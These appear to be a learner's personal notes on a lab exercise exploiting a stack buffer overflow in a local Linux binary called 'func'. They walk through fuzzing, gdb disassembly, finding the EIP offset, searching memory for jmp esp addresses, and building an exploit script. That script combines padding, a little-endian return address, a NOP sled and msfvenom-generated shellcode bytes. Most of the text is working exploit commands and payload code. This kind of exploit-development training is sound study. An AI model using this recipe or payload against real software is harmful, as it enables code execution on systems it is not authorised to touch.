### Im kinda scared about these
```bash
### DEMO 1
1.) Static Analysis
strings <program> | head
file <program> # This will verify it is a linux program (ELF, also says /lib/ld-linux.so.2)
2.) Behavioral Analysis
chmod u+x func
./func to run it
3.) Dynamic Analysis
### Fuzzing
./func $(echo "12345678") #pass arguments 
./func <<<$(echo "12345678") #The gators are simulating user input
## Disassembly
gdb ./func
shell # Will take us back to our shell
exit # Will take us back to gdb from shell
quit # Break out of gdb

info functions # Look for the @ symbol, the names of functions are before the @
run OR start # Runs the program in gdb
disass or pdisass #Disassembles a function ex: "main" ##pdisass other functions
#FUNCTIONS IN RED HAVE A HIGHER CHANCE OF BEING VULNERABLE, DO OSINT ON THOSE IN RED
4.) CREATE script
#!/usr/bin/env python
offset = "A" * 100
print(offset)

5.)
run <<<$(echo "AAAAA") the output of () is going to be output to run
run <<<$(python linbuff.py) # This is going to apply A (x100) to the output of ./func
#pinpoint EIP go to wiremask
#copy paste pattern
#0x value net to eip goese back into wiremask
#we find an offset of 62
ex: New script:
#!/usr/bin/env python
offset = "A" * 62 (This was our value in offset on wiremask)
eip = "BBBB"
#offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" (Commented out now)
print(offset+eip)
After we identify we hit EIP with "BBBB", we will find the jmp esp addresses
gdb - env func
Didnt work so in gdb we hit file func.
shell
env - gdb ./func
unse
t env COLUMNS
unset env LINES
run and ctrl+c
We need to grab first address after the heap, last address before stack
info proc map
#We get:
0xf7de1000 (After heap)
0xf7ffd000 (Before stack)
#Next,
find /b 0xf7de1000, 0xf7ffd000, 0xff, 0xe4 # Last two parts will always be the same
From result copy first 4 lines
0xf7de3b59
0xf7f588ab
0xf7f645fb
0xf7f6460f
#Take these and conver to little endian, for example: 0x|f7|de|3b|59 > \x59\x3b\xde\xf7. put little endian into EIP
#ADD NOP slep
nop = "\x90" * 15
#NEXT SET UP MSFVENOM
FROM SHELL # msfvenom -p linux/x86/exec CMD="whoami" -b "\x00\xfe\x20\x0a\xff" -f python
#THIS WILL APPEAR. COPY AND PASTE IT BELOW NOP
buf =  b""
buf += b"\xba\xa3\x11\x87\xee\xdb\xc0\xd9\x74\x24\xf4\x5d"
buf += b"\x2b\xc9\xb1\x0b\x31\x55\x14\x83\xc5\x04\x03\x55"
buf += b"\x10\x41\xe4\xed\xe5\xdd\x9e\xa0\x9f\xb5\x8d\x27"
buf += b"\xe9\xa2\xa6\x88\x9a\x44\x37\xbf\x73\xf6\x5e\x51"
buf += b"\x05\x15\xf2\x45\x12\xd9\xf3\x95\x6a\xb1\x9c\xf4"
buf += b"\xf9\x28\x63\xa0\x52\x23\x82\x83\xd5"

#THEN CHANGE print TO:
print(offset+eip+nop+buf)
FROM SHELL: ./func <<<$(python ./linbuff.py)






